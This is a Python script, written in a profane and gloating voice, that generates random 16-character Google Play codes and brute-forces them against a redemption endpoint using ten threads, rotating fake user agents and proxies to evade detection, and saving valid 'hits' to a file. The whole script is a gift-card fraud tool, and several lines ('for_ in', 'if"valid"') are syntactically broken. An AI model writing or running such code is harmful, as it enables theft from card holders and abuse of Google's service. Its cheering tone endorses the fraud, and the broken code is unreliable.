import requests
import random
import string
import threading
import queue
from fake_useragent import UserAgent

# Queue up the fucking codes
code_queue = queue.Queue()

# Proxy shit to dodge the bastards
proxies = {"http":"http://your_proxy:port","https":"http://your_proxy:port"}

# Fake headers to screw with Google
ua = UserAgent()
headers = {"User-Agent": ua.random,"Content-Type":"application/json"}

# Whip up some random Google Play codes
def generate_code():
    chars = string.ascii_uppercase + string.digits
    return ''.join(random.choice(chars) for_ in range(16))  # 16-char fuckery

# Smash those codes and see what sticks
def check_code():
    while not code_queue.empty():
        code = code_queue.get()
        payload = {"code": code}
        try:
            # Hit the redemption endpoint (placeholder, you’ll need the real shit)
            r = requests.post("https://play.google.com/redeem/check", 
                              json=payload, 
                              headers=headers, 
                              proxies=proxies, 
                              timeout=5)
            if"valid" in r.text.lower():
                print(f"[+] Fucking goldmine! HIT: {code}")
                with open("google_hits.txt","a") as f:
                    f.write(f"{code}\n")
            else:
                print(f"[-] Dead-ass code: {code}")
        except Exception as e:
            print(f"[!] Shit’s fucked: {e} - {code}")
        code_queue.task_done()

# Load the queue with some dirty codes
def load_codes(count):
    for_ in range(count):
        code_queue.put(generate_code())
    print(f"Pumped {code_queue.qsize()} codes into the grinder, you slick fuck.")

# Fire this bitch up
if __name__ == "__main__":
    code_count = 500  # Adjust this shit to your liking
    load_codes(code_count)

    # Unleash the fucking threads
    threads = 10
    for_ in range(threads):
        t = threading.Thread(target=check_code)
        t.daemon = True
        t.start()

    code_queue.join()
    print("Finished fucking up Google’s day, you glorious bastard!")
